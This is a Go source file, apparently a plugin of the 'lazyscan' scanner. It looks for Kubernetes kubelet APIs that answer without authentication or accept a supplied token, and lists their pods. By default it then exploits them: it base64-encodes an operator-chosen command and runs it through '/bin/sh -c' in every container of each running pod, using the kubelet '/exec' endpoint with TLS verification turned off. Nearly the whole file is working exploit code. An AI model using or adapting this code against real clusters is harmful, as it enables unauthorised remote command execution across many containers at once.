package plugins

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"log"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/404tk/lazyscan/common"
	"github.com/404tk/lazyscan/pkg/schema"
	"github.com/tidwall/gjson"
)

func KubeletScan(info *common.HostInfo) bool {
	opts := schema.K8sRequestOption{
		Token:    info.Token,
		Endpoint: fmt.Sprintf("https://%s:%s", info.Host, info.Port),
		Api:      "/pods",
		Method:   "GET",
	}

	resp, err := schema.ServerAccountRequest(opts)
	if err != nil || !strings.Contains(resp, "items") {
		return false
	}

	pods := gjson.Get(resp, "items").Array()
	result := fmt.Sprintf("[%s:%s] may be kubelet api unauth, there are %d pods.", info.Host, info.Port, len(pods))
	log.Println(result)
	if info.Queue != nil {
		vuln := common.Vuln{
			Host: info.Host,
			Port: info.Port,
		}
		if info.Token == "" {
			vuln.Unauth = true
		} else {
			vuln.Token = info.Token
		}
		info.Queue.Push(vuln)
	}

	if info.DisableExp {
		return true
	}
	// batch command execution
	cmd := info.Command.TCPCommand
	if cmd != "" {
		b64 := base64.StdEncoding.EncodeToString([]byte(cmd))
		urlecd := url.QueryEscape(b64)
		for _, item := range pods {
			pod := item.Get("metadata.name").String()
			namespace := item.Get("metadata.namespace").String()
			status := item.Get("status.phase").String()
			if status != "Running" {
				continue
			}
			containers := item.Get("spec.containers").Array()
			for _, c := range containers {
				// 批量pods执行时忽略报错
				api := fmt.Sprintf(opts.Endpoint+
					"/exec/%s/%s/%s?command=/bin/sh&command=-c&command=%s&error=1&output=1",
					namespace, pod, c.Get("name").String(), urlecd)
				flag := kubeletExec(info, api)
				if !flag {
					return false
				}
			}
		}
	}
	return true
}

func kubeletExec(info *common.HostInfo, api string) bool {
	httpclient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: time.Second * 20,
	}
	req, err := http.NewRequest("GET", api, nil)
	if err != nil {
		return false
	}
	if info.Token != "" {
		req.Header.Add("Authorization", "Bearer "+strings.TrimSuffix(info.Token, "\n"))
	}
	req.Header.Add("Connection", "Upgrade")
	req.Header.Add("Upgrade", "websocket")
	req.Header.Add("Sec-Websocket-Version", "13")
	req.Header.Add("Sec-Websocket-Key", "lazyscan")

	resp, err := httpclient.Do(req)
	if err != nil {
		return false
	}

	if resp.StatusCode == http.StatusSwitchingProtocols {
		return true
	}
	return false
}
